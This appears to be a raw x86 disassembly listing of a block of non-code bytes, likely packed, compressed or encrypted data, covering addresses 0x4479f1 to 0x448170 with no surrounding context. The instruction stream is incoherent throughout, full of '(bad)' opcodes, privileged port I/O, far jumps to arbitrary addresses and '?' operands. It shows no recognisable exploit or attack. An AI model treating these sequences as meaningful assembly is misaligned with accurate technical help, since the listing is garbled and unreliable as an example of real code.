  4479f1:	sub    al,0xee
  4479f3:	sbb    al,0xb7
  4479f5:	pop    ds
  4479f6:	xchg   ebp,eax
  4479f7:	and    eax,0xa17fcf5b
  4479fc:	push   esp
  4479fd:	mov    esi,0xc95dc1a5
  447a02:	mov    esi,0xff65ed4
  447a07:	repz (bad) 
  447a09:	nop
  447a0a:	add    al,0xb
  447a0c:	aad    0x24
  447a0e:	out    dx,eax
  447a0f:	jb     0x4479da
  447a11:	pusha  
  447a12:	inc    edi
  447a13:	inc    edx
  447a14:	push   es
  447a15:	(bad)  
  447a16:	mov    al,0x19
  447a18:	sbb    eax,DWORD PTR [ebx-0x12]
  447a1b:	test   DWORD PTR [ecx+0x5c2aa4f6],ecx
  447a21:	pop    ds
  447a22:	jge    0x4479c5
  447a24:	repz scas al,BYTE PTR es:[edi]
  447a26:	popa   
  447a27:	mov    ebp,gs
  447a29:	sar    BYTE PTR [ecx-0x46],1
  447a2c:	pop    esi
  447a2d:	outs   dx,BYTE PTR ds:[esi]
  447a2e:	and    ecx,eax
  447a30:	shl    DWORD PTR [ebp+edx*8-0x3f9f6074],0xf7
  447a38:	or     eax,0xf7b6fc0
  447a3d:	mov    esi,gs
  447a3f:	jl     0x447a8d
  447a41:	in     eax,dx
  447a42:	call   0x8fb9c123
  447a47:	mov    eax,ds:0x83e0a5dc
  447a4c:	and    BYTE PTR [edx+0x1a],ah
  447a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447a50:	arpl   WORD PTR [edx],si
  447a52:	push   cs
  447a53:	sbb    BYTE PTR [eax+0x7c548cc0],cl
  447a59:	push   esp
  447a5a:	aaa    
  447a5b:	xor    esi,eax
  447a5d:	sub    edi,DWORD PTR [eax-0xc]
  447a60:	and    esp,DWORD PTR [ebp+edi*8-0x7b]
  447a64:	push   edx
  447a65:	sbb    eax,0x22c1212c
  447a6a:	adc    DWORD PTR [ecx-0x376100e4],ecx
  447a70:	pop    esi
  447a71:	mov    DWORD PTR [edi+0x54804018],edx
  447a77:	(bad)  [bx+si+0x1]
  447a7b:	mov    al,bh
  447a7d:	pop    esi
  447a7e:	pop    ss
  447a7f:	outs   dx,BYTE PTR ds:[esi]
  447a80:	inc    edx
  447a81:	mov    ds:0x8708ceeb,eax
  447a86:	rol    DWORD PTR [eax],1
  447a88:	dec    esi
  447a89:	test   eax,0xab4a36d2
  447a8e:	mov    BYTE PTR [ecx],ch
  447a90:	jmp    DWORD PTR [esi]
  447a92:	mov    eax,ss:0xa69b68ea
  447a98:	inc    edx
  447a99:	lods   eax,DWORD PTR ds:[esi]
  447a9a:	mov    dh,0x79
  447a9c:	pop    esi
  447a9d:	or     BYTE PTR [ebp-0x56],0xc5
  447aa1:	pop    edi
  447aa2:	retf   
  447aa3:	xor    BYTE PTR [edx+0x61],dl
  447aa6:	adc    al,0xa8
  447aa8:	push   esp
  447aa9:	and    eax,0x6cc233f7
  447aae:	call   0x85e9784
  447ab3:	mov    dh,0x74
  447ab5:	(bad)  
  447ab6:	fldenv [esi+ebx*8]
  447ab9:	sbb    edx,DWORD PTR [edi]
  447abb:	fwait
  447abc:	pushf  
  447abd:	pop    ecx
  447abe:	mov    DWORD PTR [ebx+ebx*2+0x1cea54bf],ebx
  447ac5:	aam    0x2e
  447ac7:	pop    esi
  447ac8:	and    al,0x90
  447aca:	aas    
  447acb:	test   al,0x66
  447acd:	push   0xfffffffb
  447acf:	xchg   edi,eax
  447ad0:	sbb    BYTE PTR [ecx],dl
  447ad2:	loopne 0x447ada
  447ad4:	xor    DWORD PTR [esi+0x2],edx
  447ad7:	loopne 0x447ae0
  447ad9:	mov    cl,0xae
  447adb:	pop    eax
  447adc:	push   ebx
  447add:	adc    ecx,DWORD PTR [edx]
  447adf:	adc    esp,DWORD PTR es:[ecx-0x65]
  447ae3:	div    DWORD PTR [edx+ecx*4]
  447ae6:	xchg   cl,bl
  447ae8:	outs   dx,DWORD PTR ds:[esi]
  447ae9:	dec    ebp
  447aea:	in     eax,dx
  447aeb:	push   0x70dbe632
  447af0:	lods   eax,DWORD PTR ds:[esi]
  447af1:	xchg   ebp,eax
  447af2:	pop    ebp
  447af3:	adc    eax,DWORD PTR [esi+0x5e0993e]
  447af9:	imul   esi
  447afb:	hlt    
  447afc:	xchg   ecx,eax
  447afd:	mov    ds:0x61159b60,eax
  447b02:	imul   edi,ecx,0xffffffcc
  447b05:	inc    ecx
  447b06:	cmc    
  447b07:	sbb    BYTE PTR [ebx],bh
  447b09:	fld    QWORD PTR [ecx]
  447b0b:	les    ecx,FWORD PTR [ebx+eax*4-0x52]
  447b0f:	dec    ebx
  447b10:	jecxz  0x447aaf
  447b12:	pop    ebp
  447b13:	ret    
  447b14:	fist   DWORD PTR [ebp+0x15]
  447b17:	aaa    
  447b18:	in     al,0x38
  447b1a:	outs   dx,BYTE PTR ds:[esi]
  447b1b:	lds    esp,FWORD PTR [eax]
  447b1d:	dec    BYTE PTR [edi+0x5c]
  447b20:	aaa    
  447b21:	ds in  al,dx
  447b23:	div    ebp
  447b25:	dec    ebx
  447b26:	out    dx,al
  447b27:	pop    es
  447b28:	mov    al,ds:0x8eec08fc
  447b2d:	fwait
  447b2e:	arpl   WORD PTR [ecx+0x7fd0fd74],sp
  447b34:	jmp    0xabdd2ba8
  447b39:	xor    BYTE PTR [edi+0x55b902cb],ah
  447b3f:	lds    esp,FWORD PTR [esi+0x78afebb1]
  447b45:	mov    ecx,0xf4eea18b
  447b4a:	xchg   ebp,eax
  447b4b:	in     al,dx
  447b4c:	dec    ebp
  447b4d:	mov    ds:0x555e9afb,eax
  447b52:	popa   
  447b53:	stc    
  447b54:	retf   
  447b55:	mov    ch,0x24
  447b57:	adc    bh,ah
  447b59:	pusha  
  447b5a:	(bad)
  447b5d:	scas   eax,DWORD PTR es:[edi]
  447b5e:	and    DWORD PTR [esi],edx
  447b60:	sub    bl,BYTE PTR [ebp+0x20]
  447b63:	or     al,0x53
  447b65:	loope  0x447b93
  447b67:	mov    ?,WORD PTR fs:[ecx+0x4b1d2dd1]
  447b6e:	jge    0x447bb9
  447b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447b71:	pusha  
  447b72:	je     0x447b8d
  447b74:	aad    0x30
  447b76:	dec    ecx
  447b77:	lea    ebx,[esi+0x7d]
  447b7a:	inc    esp
  447b7b:	push   eax
  447b7c:	push   esp
  447b7d:	add    ah,BYTE PTR [ebp-0x27a0ca77]
  447b83:	xlat   BYTE PTR ds:[ebx]
  447b84:	inc    esi
  447b85:	inc    edx
  447b86:	pop    ss
  447b87:	ins    DWORD PTR es:[edi],dx
  447b88:	fiadd  WORD PTR [ebx+eiz*8-0x112fe890]
  447b8f:	or     BYTE PTR [ebx+0x59991b4e],0x4d
  447b96:	call   0x2e2f:0x4136
  447b9c:	pop    esi
  447b9d:	adc    eax,0x73951604
  447ba2:	or     ch,BYTE PTR [eax]
  447ba4:	adc    eax,0xee67eef5
  447ba9:	rol    BYTE PTR [ebx-0x2fed3a68],cl
  447baf:	mov    al,ds:0xc92c24a2
  447bb4:	(bad)  
  447bb5:	jl     0x447c09
  447bb7:	ins    DWORD PTR es:[edi],dx
  447bb8:	pop    ebx
  447bb9:	jmp    0xdb9e:0x830530da
  447bc0:	sub    edx,DWORD PTR es:[edi-0x5f]
  447bc4:	paddq  mm2,QWORD PTR [ecx+ebx*2+0x5b]
  447bc9:	mov    WORD PTR [esi-0x73],ss
  447bcc:	pop    esi
  447bcd:	mov    dh,0xdf
  447bcf:	clc    
  447bd0:	mov    ebp,DWORD PTR [esi+0x521f9b5e]
  447bd6:	mov    DWORD PTR [edx],esp
  447bd8:	sbb    bl,bh
  447bda:	into   
  447bdb:	xchg   esi,eax
  447bdc:	add    dh,BYTE PTR [ebp+ebp*4-0x1a]
  447be0:	xor    ecx,ebp
  447be2:	leave  
  447be3:	mov    al,ds:0x9bbe04c4
  447be8:	outs   dx,BYTE PTR ds:[esi]
  447be9:	aas    
  447bea:	ins    BYTE PTR es:[edi],dx
  447beb:	lea    esp,[eax]
  447bed:	shl    DWORD PTR [ebp+0x21],cl
  447bf0:	dec    ebx
  447bf1:	sub    DWORD PTR [eax+edi*8-0x6c],eax
  447bf5:	(bad)  
  447bf7:	data16 xor dh,BYTE PTR [esi-0x5283b19d]
  447bfe:	sbb    esp,DWORD PTR [ecx-0x62ea8fc3]
  447c04:	jge    0x447bcb
  447c06:	retf   0x6a9f
  447c09:	mov    bl,0xee
  447c0b:	retf   
  447c0c:	popa   
  447c0d:	mov    dh,BYTE PTR [esi]
  447c0f:	push   ds
  447c10:	sbb    cl,BYTE PTR [edi-0x30016014]
  447c16:	xchg   edx,eax
  447c17:	stos   DWORD PTR es:[edi],eax
  447c18:	fidiv  WORD PTR [eax-0x6bafa4ef]
  447c1e:	out    dx,al
  447c1f:	(bad)  
  447c21:	lock dec ebp
  447c23:	inc    ebp
  447c24:	mov    dh,0x2f
  447c26:	cmp    al,0xa1
  447c28:	push   ebp
  447c29:	inc    edi
  447c2a:	cdq    
  447c2b:	fadd   QWORD PTR [eax]
  447c2d:	popf   
  447c2e:	(bad)  
  447c2f:	icebp  
  447c30:	gs cmp al,0xd4
  447c33:	ss imul esp,eax,0x5a
  447c37:	popa   
  447c38:	addr16 mov ebx,0x7d4eab5f
  447c3e:	add    dh,BYTE PTR [ebx+0x4a]
  447c41:	and    al,dl
  447c43:	xchg   BYTE PTR [di],dl
  447c46:	mov    bh,BYTE PTR [ebp+0x46]
  447c49:	sub    esi,0xffffffed
  447c4c:	sub    DWORD PTR [esi+0x3d4b625f],esp
  447c52:	sbb    al,0xa2
  447c54:	push   cs
  447c55:	mov    esi,0x7d68cdf6
  447c5a:	dec    ebp
  447c5b:	jne    0x447c20
  447c5d:	jbe    0x447c48
  447c5f:	repnz imul ebx,DWORD PTR [eax+0x2c9d7da9],0xffffffb4
  447c67:	xlat   BYTE PTR ds:[ebx]
  447c68:	jp     0x447c09
  447c6a:	inc    ecx
  447c6b:	mov    eax,ds:0x268e48e3
  447c70:	pop    ss
  447c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447c72:	(bad)  
  447c73:	jmp    0x447cd3
  447c75:	mov    ebx,0x42b19d94
  447c7a:	enter  0x16d9,0x61
  447c7e:	test   edi,ebx
  447c80:	hlt    
  447c81:	ins    BYTE PTR es:[edi],dx
  447c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447c83:	dec    edx
  447c84:	push   ds
  447c85:	push   es
  447c86:	lock shl DWORD PTR [esi-0x7b],1
  447c8a:	addr16 loope 0x447c1a
  447c8d:	xor    al,0x5c
  447c8f:	leave  
  447c90:	jle    0x447ce4
  447c92:	mov    edi,0x71b9c62
  447c97:	stos   DWORD PTR es:[edi],eax
  447c98:	adc    al,0x11
  447c9a:	cmp    DWORD PTR [esp+eiz*2],edi
  447c9d:	lock out 0x85,al
  447ca0:	pop    edi
  447ca1:	mov    dl,0x26
  447ca3:	leave  
  447ca4:	jno    0x447c69
  447ca6:	adc    esp,DWORD PTR [edx+0x6610206a]
  447cac:	pop    es
  447cad:	and    ebx,DWORD PTR [edx-0x10e75bab]
  447cb3:	pop    ss
  447cb4:	push   ebp
  447cb5:	dec    esp
  447cb6:	in     eax,0xac
  447cb8:	pop    esi
  447cb9:	aad    0x50
  447cbb:	lahf   
  447cbc:	(bad)  [ecx-0x78]
  447cbf:	mov    eax,ds:0xca134f8
  447cc4:	pop    ss
  447cc5:	fsub   QWORD PTR [edx]
  447cc7:	cwde   
  447cc8:	arpl   WORD PTR [eax],ax
  447cca:	nop
  447ccb:	stos   BYTE PTR es:[edi],al
  447ccc:	sti    
  447ccd:	mov    dl,0x2a
  447ccf:	sar    DWORD PTR [ebp+0x32],0xea
  447cd3:	mov    edx,0x8d560eb
  447cd8:	push   edi
  447cd9:	sbb    dl,BYTE PTR [ebp+0x53]
  447cdc:	les    esi,FWORD PTR [esi+0x5c3ae7]
  447ce2:	push   0xfffffffc
  447ce4:	jle    0x447ce4
  447ce6:	in     eax,dx
  447ce7:	xor    eax,0xf136bcf0
  447cec:	(bad)  
  447ced:	pop    edi
  447cee:	andnps xmm3,XMMWORD PTR [edi+0x1d]
  447cf2:	into   
  447cf3:	stc    
  447cf4:	aas    
  447cf5:	lea    edx,[edi+ecx*8+0x35f5795e]
  447cfc:	imul   eax,esp,0xffffffa2
  447cff:	xlat   BYTE PTR ds:[ebx]
  447d00:	out    0x60,al
  447d02:	sub    BYTE PTR [edi*1+0x4e9dad0a],0x52
  447d0a:	in     al,dx
  447d0b:	fisttp QWORD PTR [ebp-0x48]
  447d0e:	fcomp  QWORD PTR [edx-0xc]
  447d11:	stos   DWORD PTR es:[edi],eax
  447d12:	dec    esi
  447d13:	mov    al,0x6d
  447d15:	push   ebp
  447d16:	out    dx,al
  447d17:	inc    esi
  447d18:	xchg   DWORD PTR [edx],eax
  447d1a:	mov    eax,ds:0x926356d4
  447d1f:	mov    eax,ds:0x6e3abda9
  447d24:	arpl   WORD PTR [edi+eiz*8+0x1f],cx
  447d28:	pop    esi
  447d29:	pop    esp
  447d2a:	cmc    
  447d2b:	rsm    
  447d2d:	pop    edi
  447d2e:	ins    BYTE PTR es:[edi],dx
  447d2f:	jg     0x447cf4
  447d31:	pop    ebx
  447d32:	push   ebx
  447d33:	mov    DWORD PTR [ebp+0x1a],edi
  447d36:	cmp    al,0x61
  447d38:	sub    BYTE PTR [edi],ch
  447d3a:	mov    ecx,0xeea46a58
  447d3f:	add    al,0xa8
  447d41:	fistp  DWORD PTR [ebx-0x89646d3]
  447d47:	neg    bl
  447d49:	enter  0xf0cc,0x60
  447d4d:	popa   
  447d4e:	and    al,0xfa
  447d50:	into   
  447d51:	push   ss
  447d52:	lahf   
  447d53:	pop    edi
  447d54:	fucomp st(3)
  447d56:	mov    DWORD PTR [ebx-0x5e],0xffc2ee2d
  447d5d:	fmul   QWORD PTR [eax+0x7cd0aea1]
  447d63:	push   ecx
  447d64:	pop    ss
  447d65:	fimul  WORD PTR [edi-0xe]
  447d68:	pop    esi
  447d69:	push   ds
  447d6a:	cwde   
  447d6b:	sub    BYTE PTR [edx-0x72],ah
  447d6e:	mov    ds:0x7160f15d,al
  447d73:	cld    
  447d74:	lahf   
  447d75:	or     ebp,esp
  447d77:	add    eax,0x57eede63
  447d7c:	push   0x39801448
  447d81:	sbb    dl,BYTE PTR [ecx]
  447d83:	or     DWORD PTR [edi+ebx*2+0x3e157876],ecx
  447d8a:	xor    ecx,DWORD PTR [edi-0x170a4305]
  447d90:	fs push ebx
  447d92:	xor    al,0x97
  447d94:	dec    ebp
  447d95:	popa   
  447d96:	jmp    0xd9a4:0x70ff7f51
  447d9d:	add    al,0x6a
  447d9f:	popf   
  447da0:	dec    edx
  447da1:	jo     0x447d32
  447da3:	and    DWORD PTR [edx+0x5ee486ca],ebp
  447da9:	lods   eax,DWORD PTR ds:[esi]
  447daa:	cs leave 
  447dac:	dec    ecx
  447dad:	jno    0x447d5c
  447daf:	sar    DWORD PTR [ecx-0x35988ea3],cl
  447db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447db6:	jmp    0x447d79
  447db8:	sahf   
  447db9:	fisub  DWORD PTR [esi]
  447dbb:	xchg   DWORD PTR [esi-0x3b],ebx
  447dbe:	add    al,0x86
  447dc0:	in     al,0x9c
  447dc2:	(bad)  
  447dc3:	sbb    al,0xce
  447dc5:	pusha  
  447dc6:	lods   eax,DWORD PTR ds:[esi]
  447dc7:	dec    ecx
  447dc8:	out    dx,al
  447dc9:	je     0x447d6a
  447dcb:	mov    dl,0x69
  447dcd:	jl     0x447dd0
  447dcf:	pusha  
  447dd0:	xor    cl,bh
  447dd2:	outs   dx,BYTE PTR ds:[esi]
  447dd3:	cmp    BYTE PTR [eax-0x31],dh
  447dd6:	pusha  
  447dd7:	into   
  447dd8:	test   BYTE PTR [esi-0x4a2a5e9d],ch
  447dde:	imul   ebx,DWORD PTR [ecx+0x12],0xffffff92
  447de2:	fist   WORD PTR [edi+ebx*2]
  447de5:	bnd jbe 0x447dcb
  447de8:	(bad)  
  447de9:	iret   
  447dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447deb:	js     0x447e53
  447ded:	lahf   
  447dee:	icebp  
  447def:	mov    al,ds:0x51a172f7
  447df4:	mov    al,0x9d
  447df6:	int    0x25
  447df8:	pop    esi
  447df9:	adc    eax,0x510e0b26
  447dfe:	call   0x53bf:0x4100a316
  447e05:	jmp    0x885f1e2a
  447e0a:	std    
  447e0b:	cmp    BYTE PTR [esi],0x1e
  447e0e:	fidivr WORD PTR [edi]
  447e10:	add    dh,BYTE PTR [ebp+0x0]
  447e13:	mov    bl,0x94
  447e15:	imul   ebp,DWORD PTR [esi-0x57],0x96184124
  447e1c:	frstor [eax+0x50]
  447e1f:	jbe    0x447e87
  447e21:	adc    DWORD PTR [ebp-0x11b0c7e6],edx
  447e27:	ja     0x447e25
  447e29:	cmp    edx,DWORD PTR [eax]
  447e2b:	push   esp
  447e2c:	out    dx,eax
  447e2d:	dec    esp
  447e2e:	in     eax,dx
  447e2f:	mov    al,ds:0xae8c6957
  447e34:	cmp    bl,BYTE PTR [edi-0x219f7c1d]
  447e3a:	pop    ss
  447e3b:	pop    ebx
  447e3c:	and    ebp,DWORD PTR cs:[ecx-0x715c84e0]
  447e43:	(bad)  [ecx+eiz*2-0x7e]
  447e47:	inc    edi
  447e48:	jo     0x447e01
  447e4a:	or     BYTE PTR [ecx],al
  447e4c:	bound  ebp,QWORD PTR [edi-0x13]
  447e4f:	les    esp,FWORD PTR [edi-0x8ac20f5]
  447e55:	ficom  WORD PTR [esi+0x77]
  447e58:	popf   
  447e59:	pop    edi
  447e5a:	push   cs
  447e5b:	pop    ebx
  447e5c:	inc    edx
  447e5d:	sbb    DWORD PTR [edx+edx*4+0xdb0a4f2],ebx
  447e64:	dec    ebx
  447e65:	jp     0x447e44
  447e67:	mov    ebp,0xbbbb2f5e
  447e6c:	daa    
  447e6d:	cmc    
  447e6e:	or     eax,0x77315293
  447e73:	(bad)  
  447e74:	std    
  447e75:	mov    al,ds:0x53e70394
  447e7a:	inc    ebp
  447e7b:	les    ebx,FWORD PTR [esi+0x76]
  447e7e:	mov    ch,0xcd
  447e80:	pop    es
  447e81:	(bad)  
  447e82:	xor    ah,ch
  447e84:	bound  esp,QWORD PTR [ebp-0x57]
  447e87:	inc    ebx
  447e88:	fisubr WORD PTR [edx-0x6b]
  447e8b:	xchg   edx,eax
  447e8c:	aam    0x7d
  447e8e:	mov    eax,ds:0x772439b3
  447e93:	lahf   
  447e94:	push   es
  447e95:	mov    eax,ds:0x8ba15849
  447e9a:	add    BYTE PTR [ecx+0x33cedace],ah
  447ea0:	jp     0x447ecf
  447ea2:	cld    
  447ea3:	push   ss
  447ea4:	and    ch,ch
  447ea6:	sbb    bl,BYTE PTR [edi-0x1e74c878]
  447eac:	cmp    DWORD PTR [ecx],0xbb15c571
  447eb2:	cmp    BYTE PTR [esi+0x4ce90af0],ah
  447eb8:	aaa    
  447eb9:	popa   
  447eba:	cmp    eax,0xc0ff29b0
  447ebf:	jo     0x447f12
  447ec1:	pop    ebp
  447ec2:	inc    ecx
  447ec3:	push   esp
  447ec4:	ror    BYTE PTR [eax],1
  447ec6:	out    dx,al
  447ec7:	jo     0x447ed6
  447ec9:	cld    
  447eca:	imul   esi,eax,0x75
  447ecd:	pusha  
  447ece:	in     eax,dx
  447ecf:	cmp    ch,BYTE PTR [edx]
  447ed1:	sahf   
  447ed2:	push   ebp
  447ed3:	adc    ah,BYTE PTR [ebp-0x71]
  447ed6:	or     al,BYTE PTR [eax-0x15117227]
  447edc:	mov    eax,ds:0x9922b9d2
  447ee1:	jb     0x447eba
  447ee3:	add    DWORD PTR [ebp+0x199f1043],esi
  447ee9:	ja     0x447f19
  447eeb:	xchg   ecx,eax
  447eec:	je     0x447e72
  447eee:	aam    0xff
  447ef0:	pop    edi
  447ef1:	ds push 0xd8307240
  447ef7:	cmp    BYTE PTR [edx-0x22],ch
  447efa:	adc    al,0xa1
  447efc:	and    BYTE PTR [esi+edx*4-0x506c4160],al
  447f03:	or     eax,0xf01caf5e
  447f08:	jnp    0x447f83
  447f0a:	clc    
  447f0b:	xor    eax,0x676060d0
  447f10:	adc    DWORD PTR [ebx],esi
  447f12:	pop    edi
  447f13:	fwait
  447f14:	ret    
  447f15:	pushf  
  447f16:	push   ds
  447f17:	xchg   ecx,ecx
  447f19:	jo     0x447e9b
  447f1b:	mov    edi,ebp
  447f1d:	pusha  
  447f1e:	jnp    0x447f3a
  447f20:	test   DWORD PTR [edx-0x79],esp
  447f23:	fcom   QWORD PTR [esi]
  447f25:	in     al,0xf3
  447f27:	sbb    DWORD PTR [ecx],0xffffffa7
  447f2a:	mov    esp,0x8d603c6e
  447f2f:	push   ecx
  447f30:	mov    esp,0x6380d832
  447f35:	xchg   esp,eax
  447f36:	shl    BYTE PTR [ebx-0x63],0x7c
  447f3a:	iret   
  447f3b:	jb     0x447f1b
  447f3d:	mov    dh,0xbe
  447f3f:	gs or  eax,0x5e1d46e4
  447f45:	mov    edx,0xd6fa1a3d
  447f4a:	jns    0x447fa8
  447f4c:	mov    bl,0x60
  447f4e:	or     eax,0xfc1b0429
  447f53:	cmc    
  447f54:	inc    ebp
  447f55:	int    0x20
  447f57:	sbb    al,0x95
  447f59:	loopne 0x447f05
  447f5b:	lods   al,BYTE PTR ds:[esi]
  447f5c:	cs pop eax
  447f5e:	cmp    eax,0x1a5df6fc
  447f63:	gs mov bh,0x32
  447f66:	popf   
  447f67:	jg     0x447fde
  447f69:	clc    
  447f6a:	add    ch,BYTE PTR [eax]
  447f6c:	push   0x2e27b63b
  447f71:	scas   eax,DWORD PTR es:[edi]
  447f72:	retf   
  447f73:	aaa    
  447f74:	or     DWORD PTR [ecx-0x1],esp
  447f77:	arpl   WORD PTR ds:0x4c2c95a6,bp
  447f7d:	mov    esp,0x5454e84e
  447f82:	sbb    DWORD PTR ss:[esi-0x14e7bc15],0x7f
  447f8a:	push   es
  447f8b:	mov    eax,ds:0x39196026
  447f90:	or     ch,BYTE PTR [ecx-0x2a]
  447f93:	jb     0x447f19
  447f95:	sbb    esi,ebp
  447f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447f98:	xor    eax,0xdd3d981
  447f9d:	adc    ecx,DWORD PTR [ecx-0x5f]
  447fa0:	fsubr  DWORD PTR [edi+0x20]
  447fa3:	pop    ecx
  447fa4:	cmp    BYTE PTR [edi-0x5b7e4fe9],0x5c
  447fab:	iret   
  447fac:	pop    esi
  447fad:	inc    ecx
  447fae:	xchg   edi,eax
  447faf:	pop    esi
  447fb0:	loopne 0x447fc5
  447fb2:	aad    0x57
  447fb4:	sbb    eax,0x87fd9861
  447fb9:	push   edx
  447fba:	lods   al,BYTE PTR ds:[esi]
  447fbb:	sub    ebx,edi
  447fbd:	mov    eax,0xad71e5ee
  447fc2:	sahf   
  447fc3:	fdiv   DWORD PTR [esi+0x29aa6e63]
  447fc9:	xchg   bh,dh
  447fcb:	cdq    
  447fcc:	xchg   ebx,eax
  447fcd:	pusha  
  447fce:	or     BYTE PTR [ecx-0x2c4d123],bh
  447fd4:	adc    BYTE PTR [eax+0x51c7bfef],0xb6
  447fdb:	loopne 0x447fec
  447fdd:	rcr    ch,0x59
  447fe0:	xor    ah,BYTE PTR [eax-0x1c]
  447fe3:	dec    ecx
  447fe4:	jne    0x447f91
  447fe6:	scas   eax,DWORD PTR es:[edi]
  447fe7:	xchg   ebp,eax
  447fe8:	inc    esi
  447fe9:	mov    esp,0x58a3c0fa
  447fee:	out    dx,al
  447fef:	cmc    
  447ff0:	cld    
  447ff1:	shl    DWORD PTR [esi+0x4d443d20],cl
  447ff7:	mov    eax,ds:0xeff5e794
  447ffc:	sar    ch,0x66
  447fff:	arpl   WORD PTR [edi+eax*8-0x5d],sp
  448003:	dec    ebx
  448004:	mov    DWORD PTR [eax+0x6389831e],0x46689051
  44800e:	retf   0x3be2
  448011:	fidiv  WORD PTR [ecx]
  448013:	mov    bl,0x9e
  448015:	sahf   
  448016:	loopne 0x447fd8
  448018:	mov    BYTE PTR [esi-0x6ec60815],bh
  44801e:	dec    eax
  44801f:	int    0x96
  448021:	call   0x61466d03
  448026:	mov    ebp,?
  448028:	das    
  448029:	jp     0x44805a
  44802b:	ds pop edi
  44802d:	cmp    eax,0x4a4ad6ee
  448032:	lods   al,BYTE PTR ds:[esi]
  448033:	push   0x3e
  448035:	fstp   TBYTE PTR [ecx+0x73]
  448038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448039:	pop    edi
  44803a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44803b:	push   eax
  44803c:	scas   al,BYTE PTR es:[edi]
  44803d:	sahf   
  44803e:	push   esi
  44803f:	dec    edx
  448040:	das    
  448041:	popf   
  448042:	pop    ss
  448043:	adc    BYTE PTR [edx+0x41],ah
  448046:	in     al,dx
  448047:	or     esp,eax
  448049:	dec    ecx
  44804a:	fwait
  44804b:	mov    edi,0xa11f8731
  448050:	push   ebp
  448051:	clc    
  448052:	adc    eax,0xee24d32c
  448057:	jp     0x448078
  448059:	out    dx,eax
  44805a:	sub    cl,bl
  44805c:	xor    eax,0xcaa13b6c
  448061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448062:	int3   
  448063:	out    0xd,al
  448065:	cdq    
  448066:	lods   eax,DWORD PTR ds:[esi]
  448067:	mov    esp,0xb3ee3688
  44806c:	ficom  WORD PTR [eax-0x4f]
  44806f:	mov    ebx,0xa0e6f5dd
  448074:	add    cl,ch
  448076:	sub    eax,DWORD PTR ds:0xc589e5ac
  44807c:	into   
  44807d:	cs jecxz 0x448003
  448080:	pop    ebx
  448081:	loope  0x4480e0
  448083:	imul   ebx,DWORD PTR [eax],0x70
  448086:	rol    BYTE PTR [eax],0x20
  448089:	xchg   esp,eax
  44808a:	rcr    bh,1
  44808c:	jno    0x4480ee
  44808e:	xchg   esi,eax
  44808f:	push   ebx
  448090:	retf   
  448091:	mov    bl,0xea
  448093:	out    dx,al
  448094:	outs   dx,DWORD PTR ds:[esi]
  448095:	xchg   edx,eax
  448096:	clc    
  448097:	dec    edx
  448098:	cmp    eax,0x1aaaeeee
  44809d:	inc    ebx
  44809e:	xor    ecx,DWORD PTR [edx+0x5b]
  4480a1:	popa   
  4480a2:	aas    
  4480a3:	fwait
  4480a4:	(bad)  
  4480a5:	jne    0x448079
  4480a7:	cmp    al,0x5d
  4480a9:	lods   eax,DWORD PTR ds:[esi]
  4480aa:	out    dx,al
  4480ab:	lea    ebx,[esi-0x4ae894e0]
  4480b1:	jno    0x4480a6
  4480b3:	mov    ?,WORD PTR [eax-0x30a04201]
  4480b9:	push   cs
  4480ba:	out    dx,al
  4480bb:	inc    ebx
  4480bc:	and    edx,DWORD PTR [edi-0x2ea4aeda]
  4480c2:	(bad)  
  4480c4:	cdq    
  4480c5:	or     BYTE PTR [esi-0x245bf987],0xa0
  4480cc:	je     0x44811b
  4480ce:	xor    esi,ebp
  4480d0:	ins    BYTE PTR es:[edi],dx
  4480d1:	cmp    eax,0xd65b67ad
  4480d6:	packsswb mm6,QWORD PTR [edi-0x1f]
  4480da:	or     eax,0xcebe768b
  4480df:	mov    cl,0x72
  4480e1:	inc    esp
  4480e2:	or     eax,0x3ca0a5d2
  4480e7:	fs push edi
  4480e9:	xchg   ebx,eax
  4480ea:	(bad)  
  4480ec:	pop    esi
  4480ed:	in     al,dx
  4480ee:	out    0x4e,al
  4480f0:	push   ebp
  4480f1:	fs sbb eax,ecx
  4480f4:	inc    ebx
  4480f5:	pop    edx
  4480f6:	dec    eax
  4480f7:	fidiv  WORD PTR [ecx-0x7d679a67]
  4480fd:	adc    BYTE PTR [edi+0x35],ah
  448100:	push   ds
  448101:	(bad)  
  448102:	out    dx,al
  448103:	mov    cl,0x3c
  448105:	cmp    al,0x23
  448107:	xchg   esi,eax
  448108:	ret    
  448109:	mov    eax,ds:0x46c5a0de
  44810e:	js     0x44817f
  448110:	fldcw  WORD PTR [ebx-0x2a]
  448113:	and    DWORD PTR [ecx+0x33],edx
  448116:	push   ss
  448117:	xor    eax,0x95ffdf5e
  44811c:	ins    BYTE PTR es:[edi],dx
  44811d:	shr    BYTE PTR ds:0x7aee278d,1
  448123:	loope  0x448193
  448125:	jno    0x44818c
  448127:	mov    dl,bl
  448129:	(bad)  
  44812a:	in     eax,dx
  44812b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44812c:	sub    ebp,ebp
  44812e:	into   
  44812f:	adc    eax,0xe3dee456
  448134:	adc    eax,0xddb1df44
  448139:	pusha  
  44813a:	cmc    
  44813b:	test   al,0x52
  44813d:	fucom  st(6)
  44813f:	pop    edx
  448140:	pop    esi
  448141:	add    al,0x23
  448143:	hlt    
  448144:	mov    bl,0x8f
  448146:	adc    DWORD PTR [edx-0x796e9f94],eax
  44814c:	sub    eax,0xbb297e2d
  448151:	xchg   eax,esp
  448153:	cli    
  448154:	arpl   sp,cx
  448156:	neg    edi
  448158:	xor    edx,esp
  44815a:	out    dx,al
  44815b:	popa   
  44815c:	nop
  44815d:	pop    edx
  44815e:	jl     0x448167
  448160:	xchg   DWORD PTR [edi-0x1b],esp
  448163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448164:	ficom  WORD PTR [esi+0x5c]
  448167:	sub    BYTE PTR [esp+ebp*8],0x4d
  44816b:	xor    ebx,DWORD PTR [esi+0x2b]
  44816e:	out    0x4e,eax
  448170:	mov    WORD PTR [esi],ss
